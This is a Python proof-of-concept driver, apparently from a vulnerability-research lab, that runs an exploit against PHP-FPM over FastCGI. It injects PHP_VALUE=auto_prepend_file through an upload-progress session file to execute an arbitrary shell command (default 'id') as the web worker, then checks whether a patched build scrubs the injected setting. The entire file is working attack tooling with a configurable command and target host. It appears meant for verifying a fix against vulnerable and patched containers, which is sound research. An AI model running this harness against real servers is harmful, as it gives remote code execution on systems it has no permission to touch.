#!/usr/bin/env python3
"""Driver for fcgi_autoprepend.py: lands `id` (uid=www-data) through the FastCGI
PHP_VALUE=auto_prepend_file delivery of the upload-progress write, then confirms
the sticky per-worker PHP_VALUE was scrubbed clean. Needs a multi-worker pool so
the drip and the delivery can overlap.

Bring up the lab:
    docker compose -f docker-compose.reuse.yml -p p2s-fcgi --profile fcgi up -d
    python3 -I poc/routes/verify_fcgi_autoprepend.py                 # vuln  :9100
    python3 -I poc/routes/verify_fcgi_autoprepend.py --port 9101     # patched
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fcgi_autoprepend as fa  # noqa: E402


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9100,
                    help="9100 = vuln 8.4.26, 9101 = patched 8.4.27 (compose)")
    ap.add_argument("--script", default="/var/www/html/index.php")
    ap.add_argument("--save-path", default="/tmp/sess")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--window", type=float, default=40.0)
    args = ap.parse_args(argv)

    print(f"=== fcgi auto_prepend delivery verify  {args.host}:{args.port} ===")
    ok, output, sess_file = fa.run(
        args.host, args.port, args.cmd, args.script,
        save_paths=[args.save_path], window=args.window, verbose=True,
    )

    if not ok:
        print("\nRESULT: FAIL - no command execution landed")
        return 1

    uid_ok = "uid=" in (output or "")
    print(f"\nRESULT: PASS - command executed as the fpm worker")
    print(f"  output      : {(output or '').strip()!r}")
    print(f"  sess_file   : {sess_file}")
    print(f"  uid present : {uid_ok}")

    # confirm the scrub: a fresh delivery to the (now upload-complete, empty)
    # session file must NOT execute PHP, and a plain request must be clean.
    probe = fa.fcgi_request(
        args.host, args.port,
        fa._base_params(args.script),
        timeout=5,
    )
    sticky = fa.MARK_S.encode() in probe
    print(f"  post-scrub  : worker clean (no sticky auto_prepend): {not sticky}")
    return 0 if (uid_ok and not sticky) else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
